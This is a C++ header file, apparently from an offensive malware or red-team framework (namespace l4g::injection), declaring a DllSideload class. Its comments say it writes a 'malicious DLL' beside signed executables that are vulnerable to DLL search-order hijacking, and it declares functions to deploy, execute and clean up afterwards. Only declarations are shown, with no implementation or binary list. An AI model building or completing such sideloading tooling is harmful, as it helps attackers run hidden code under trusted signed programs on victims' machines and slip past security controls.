#pragma once
#include <windows.h>
#include <vector>
#include <string>
#include <optional>

namespace l4g::injection {

struct SideloadResult {
    bool success = false;
    std::string dll_path;
    std::string target_exe;
    std::string error;
};

class DllSideload {
public:
    // Write malicious DLL next to a signed vulnerable executable
    static SideloadResult sideload_dll(const std::vector<uint8_t>& dll_data, const std::wstring& target_dir, const std::wstring& dll_name);
    
    // Known vulnerable signed binaries with DLL search order issues
    struct VulnerableBinary {
        const wchar_t* path;
        const wchar_t* dll_name;
        const wchar_t* args;
    };
    
    static const VulnerableBinary VULNERABLE_BINARIES[];
    static size_t VULNERABLE_COUNT;
    
    static SideloadResult deploy_and_execute(const std::vector<uint8_t>& dll_data, size_t binary_index);
    static bool cleanup(const SideloadResult& result);
    
private:
    static bool write_dll(const std::wstring& path, const std::vector<uint8_t>& data);
    static bool execute_binary(const std::wstring& exe, const std::wstring& args);
};

} // namespace l4g::injection